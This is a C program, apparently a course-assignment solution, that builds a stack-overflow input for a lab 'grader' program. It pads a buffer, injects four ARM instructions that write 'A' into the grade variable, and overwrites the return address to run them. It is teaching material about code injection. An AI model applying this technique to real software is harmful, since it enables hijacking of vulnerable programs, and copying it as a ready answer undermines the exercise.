/*
produces a file named dataA causing the grader program to print 'A' as the grade.
overruns the stack: writes name + '\0', pads up to buf size, inserts arm machine code
that loads 'A' into a register, stores it in the 'grade' variable in memory, and then
branches back to normal code execution. overwrites return address so execution jumps
to these instructions.
*/

/*
this main function:
- takes no arguments
- does not read stdin
- does not write stdout/stderr (except on error)
- writes crafted bytes for A grade to "dataA"
- returns 0 on success, non-zero otherwise
*/

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include "miniassembler.h"

int main(void) {
    /* chosen name truncated to avoid newline chars */
    const char *name = "Anish";
    const unsigned int charA = 65; /* ASCII 'A' */

    /* known addresses from analysis */
    unsigned long gradeAddr = 0x420044;      
    unsigned long jumpBackAddr = 0x40089c;   
    unsigned long codeStart = 0x42007c;      

    /* build instructions */
    unsigned int movInstr = MiniAssembler_mov(0, charA);
    unsigned int adrInstr = MiniAssembler_adr(1, gradeAddr, codeStart + 4);
    unsigned int strbInstr = MiniAssembler_strb(0, 1);
    unsigned int bInstr = MiniAssembler_b(jumpBackAddr, codeStart + 12);

    /* open dataA file */
    FILE *fp = fopen("dataA", "w");
    if (!fp) return 1;

    /* write name and null terminator */
    fwrite(name, 1, 5, fp);
    fputc('\0', fp);

    /* we wrote 6 bytes so far, need total 48 for buf */
    for (int i = 0; i < (48 - 6); i++)
        fputc('\0', fp);

    /* write instructions (16 bytes total) */
    fwrite(&movInstr, sizeof(movInstr), 1, fp);
    fwrite(&adrInstr, sizeof(adrInstr), 1, fp);
    fwrite(&strbInstr, sizeof(strbInstr), 1, fp);
    fwrite(&bInstr, sizeof(bInstr), 1, fp);

    /* overwrite return address to point to codeStart */
    unsigned long fakeRet = codeStart;
    fwrite(&fakeRet, sizeof(fakeRet), 1, fp);

    fclose(fp);
    return 0;
}